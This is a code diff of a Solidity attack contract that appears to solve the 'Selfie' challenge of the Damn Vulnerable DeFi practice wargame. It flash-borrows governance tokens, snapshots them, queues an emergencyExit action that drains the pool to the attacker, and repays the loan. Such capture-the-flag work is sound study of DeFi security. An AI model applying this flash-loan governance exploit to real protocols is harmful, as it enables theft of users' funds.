@@ -7,11 +7,12 @@ import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 import {SimpleGovernance} from "./SimpleGovernance.sol";
 import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
 import {SelfiePool} from "./SelfiePool.sol";
-import "forge-std/Test.sol";
 import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
-contract SimpleGovernanceAttack is Test {
+contract SimpleGovernanceAttack is IERC3156FlashBorrower {
     using Address for address;
+
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
 
     DamnValuableTokenSnapshot public governanceToken;
     SimpleGovernance public governance;
@@ -27,25 +28,29 @@ contract SimpleGovernanceAttack is Test {
     }
 
     function attack() public {
+        // 1. Flash loan all DVT from selfiePool
         selfiePool.flashLoan({
             _receiver: IERC3156FlashBorrower(address(this)),
             _token: address(governanceToken),
             _amount: governanceToken.balanceOf(address(selfiePool)),
-            _data: abi.encodeWithSignature("receiveTokens(address,uint256)", address(governanceToken), governanceToken.balanceOf(address(selfiePool)))
+            _data: abi.encodeWithSignature(
+                "receiveTokens(address,uint256)", address(governanceToken), governanceToken.balanceOf(address(selfiePool))
+                )
         });
     }
 
-    function receiveTokens(address _token, uint256 _amount) public {
+    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
         // 2. Create token snapshot
         governanceToken.snapshot();
         // 3. Queue a governance action to drain all DVT from selfiePool
         actionId = governance.queueAction({
             target: address(selfiePool),
             value: 0,
-            data: abi.encodeWithSignature("drainAllFunds(address)", address(attacker))
+            data: abi.encodeWithSignature("emergencyExit(address)", address(attacker))
         });
         // 4. Return the flash loan
-        DamnValuableTokenSnapshot(_token).transfer(address(selfiePool), _amount);
+        DamnValuableTokenSnapshot(token).approve(address(selfiePool), amount);
+        return CALLBACK_SUCCESS;
     }
 
     function attack2() public {
